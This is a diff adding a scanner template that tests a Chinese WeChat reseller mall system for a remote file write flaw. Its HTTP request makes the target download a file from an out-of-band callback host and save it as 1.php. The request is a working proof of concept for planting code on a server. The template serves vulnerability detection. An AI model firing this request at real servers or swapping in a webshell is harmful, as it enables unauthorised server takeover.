@@ -1,0 +1,21 @@
+id: poc-yaml-internet-wechat-dlfile-upload
+info:
+  name: 微商代理商补货商城系统 dlfile?file_url存在远程文件写入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: DNSLOG,任意写入
+http:
+  - raw:
+      - |
+        GET /home/test/dlfile?file_url=http://{{interactsh-url}}/1.txt&save_to=1.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
